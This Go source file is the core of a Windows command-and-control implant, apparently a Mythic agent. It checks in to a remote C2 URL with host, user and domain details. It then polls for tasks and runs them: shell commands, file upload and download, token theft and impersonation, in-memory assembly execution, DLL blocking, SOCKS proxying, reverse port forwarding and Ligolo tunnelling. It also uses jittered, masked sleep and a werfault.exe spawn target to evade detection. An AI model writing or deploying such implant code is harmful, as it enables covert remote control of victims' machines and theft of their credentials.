//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"math"
	"net/http"
	"os"
	"strings"
	"time"
)

type Agent struct {
	UUID         string
	Key          []byte
	C2URL        string
	Sleep        int
	Jitter       float64
	KillDate     int64
	crypt        *Crypt
	LastCheckin  time.Time
	NumCallback  int
	Delegate     bool
	Spawnto      string
	Socks        *SocksServer
	Rportfwds    map[int]*RportFwd
	Ligolo       *LigoloTunnel
}

func NewAgent(c2URL string, uuid string, key []byte, sleep int, jitter float64) *Agent {
	if uuid == "" {
		uuid = generateUUID()
	}
	if key == nil || len(key) == 0 {
		key, _ = GenerateKey()
	}

	return &Agent{
		UUID:       uuid,
		Key:        key,
		C2URL:      c2URL,
		Sleep:      sleep,
		Jitter:     jitter,
		LastCheckin: time.Now(),
		crypt:      NewCrypt(key),
		Spawnto:    "C:\\Windows\\System32\\werfault.exe",
		Rportfwds:  make(map[int]*RportFwd),
	}
}

func generateUUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func (a *Agent) Run() {
	a.checkin()

	for {
		if a.KillDate > 0 && time.Now().Unix() > a.KillDate {
			return
		}

		a.NumCallback++

		resp, err := a.getTasking()
		if err != nil {
			sleepDuration := calculateSleep(a.Sleep, a.Jitter)
			MaskSleep(a.Key)
			time.Sleep(sleepDuration)
			UnmaskSleep(a.Key)
			continue
		}

		if resp != nil && len(resp.Tasks) > 0 {
			for _, task := range resp.Tasks {
				result := a.executeTask(task)
				a.postResponse(result)
			}
		}

		sleepDuration := calculateSleep(a.Sleep, a.Jitter)
		MaskSleep(a.Key)
		time.Sleep(sleepDuration)
		UnmaskSleep(a.Key)
	}
}

func (a *Agent) checkin() {
	hostname, _ := os.Hostname()
	username := getUsername()
	ips := GetLocalIPs()

	checkin := CheckinInfo{
		Action:         "checkin",
		UUID:           a.UUID,
		OS:             fmt.Sprintf("Windows %d.%d.%d", getOSInfo().Major, getOSInfo().Minor, getOSInfo().Build),
		User:           username,
		Host:           hostname,
		PID:            getProcessID(),
		IP:             strings.Join(ips, ","),
		Architecture:   GetArchitecture(),
		Domain:         GetDomainInfo(),
		Integrity:      int(GetIntegrityLevel()),
		EncryptionKey:  base64.StdEncoding.EncodeToString(a.Key),
		DecryptionKey:  base64.StdEncoding.EncodeToString(a.Key),
	}

	payload, err := a.EncodeMessage("checkin", checkin)
	if err != nil {
		return
	}

	client := &http.Client{Timeout: time.Duration(DefaultTimeout) * time.Second}
	resp, err := client.Post(a.C2URL, "application/json", bytes.NewReader(payload))
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	msg, err := a.DecodeMessage(body)
	if err != nil {
		return
	}

	if msg != nil {
		a.LastCheckin = time.Now()
	}
}

func (a *Agent) getTasking() (*MythicMessage, error) {
	taskingReq := MythicMessage{
		Action: "get_tasking",
		UUID:   a.UUID,
	}

	payload, err := a.EncodeMessage("get_tasking", taskingReq)
	if err != nil {
		return nil, err
	}

	client := &http.Client{Timeout: time.Duration(DefaultTimeout) * time.Second}
	resp, err := client.Post(a.C2URL, "application/json", bytes.NewReader(payload))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return a.DecodeMessage(body)
}

func (a *Agent) postResponse(resp MythicResponse) {
	payload, err := a.EncodeMessage("post_response", resp)
	if err != nil {
		return
	}

	client := &http.Client{Timeout: time.Duration(DefaultTimeout) * time.Second}
	_, err = client.Post(a.C2URL, "application/json", bytes.NewReader(payload))
	if err != nil {
		return
	}
}

func (a *Agent) executeTask(task MythicTask) MythicResponse {
	result := MythicResponse{
		Action:    "post_response",
		UUID:      a.UUID,
		TaskUUID:  task.UUID,
		Status:    "success",
		Completed: true,
	}

	if a.Delegate {
		return a.executeDelegate(task, result)
	}

	switch task.Command {
	case "shell":
		result.UserOutput = cmdShell(task.Params)
	case "run":
		result.UserOutput = cmdRun(task.Params)
	case "cd":
		result.UserOutput = cmdCd(task.Params)
	case "pwd":
		result.UserOutput = cmdPwd()
	case "ls":
		result.UserOutput = cmdLs(task.Params)
	case "cat":
		result.UserOutput = cmdCat(task.Params)
	case "cp":
		result.UserOutput = cmdCp(task.Params)
	case "mv":
		result.UserOutput = cmdMv(task.Params)
	case "rm":
		result.UserOutput = cmdRm(task.Params)
	case "mkdir":
		result.UserOutput = cmdMkdir(task.Params)
	case "download":
		result.UserOutput = cmdDownload(task.Params, &result)
	case "upload":
		result.UserOutput = cmdUpload(task.Params)
	case "ps":
		result.UserOutput = cmdPs()
	case "kill":
		result.UserOutput = cmdKill(task.Params)
	case "getuid":
		result.UserOutput = cmdGetuid()
	case "whoami":
		result.UserOutput = cmdWhoami(task.Params)
	case "sleep":
		result.UserOutput = cmdSleep(task.Params, a)
	case "ifconfig":
		result.UserOutput = cmdIfconfig()
	case "make_token":
		result.UserOutput = cmdMakeToken(task.Params)
	case "steal_token":
		result.UserOutput = cmdStealToken(task.Params)
	case "rev2self":
		result.UserOutput = cmdRev2self()
	case "runas":
		result.UserOutput = cmdRunas(task.Params)
	case "spawn":
		result.UserOutput = cmdSpawn(task.Params)
	case "spawnto":
		result.UserOutput = cmdSpawnto(task.Params, a)
	case "execute_assembly":
		result.UserOutput = cmdExecuteAssembly(task.Params)
	case "blockdlls":
		result.UserOutput = cmdBlockDlls(task.Params)
	case "socks":
		result.UserOutput = cmdSocks(task.Params, a)
	case "rportfwd":
		result.UserOutput = cmdRportfwd(task.Params, a)
	case "ligolo_start":
		result.UserOutput = cmdLigoloStart(task.Params, a)
	case "ligolo_stop":
		result.UserOutput = cmdLigoloStop(task.Params, a)
	case "ligolo_status":
		result.UserOutput = cmdLigoloStatus(a)
	case "exit":
		result.UserOutput = "exiting"
		go func() {
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}()
	default:
		result.Status = "error"
		result.UserOutput = fmt.Sprintf("unknown command: %s", task.Command)
	}

	return result
}

func (a *Agent) executeDelegate(task MythicTask, result MythicResponse) MythicResponse {
	result.UserOutput = "delegate commands not implemented"
	return result
}

func calculateSleep(baseSleep int, jitter float64) time.Duration {
	if jitter > 0 {
		jitterAmount := float64(baseSleep) * (jitter / 100.0)
		jitterDelta := (cryptoRandFloat64() - 0.5) * 2 * jitterAmount
		return time.Duration(float64(baseSleep)+jitterDelta) * time.Second
	}
	return time.Duration(baseSleep) * time.Second
}

func cryptoRandFloat64() float64 {
	b := make([]byte, 8)
	rand.Read(b)
	return float64(uint64(b[0])|uint64(b[1])<<8|uint64(b[2])<<16|uint64(b[3])<<24|uint64(b[4])<<32|uint64(b[5])<<40|uint64(b[6])<<48|uint64(b[7])<<56) / float64(math.MaxUint64)
}
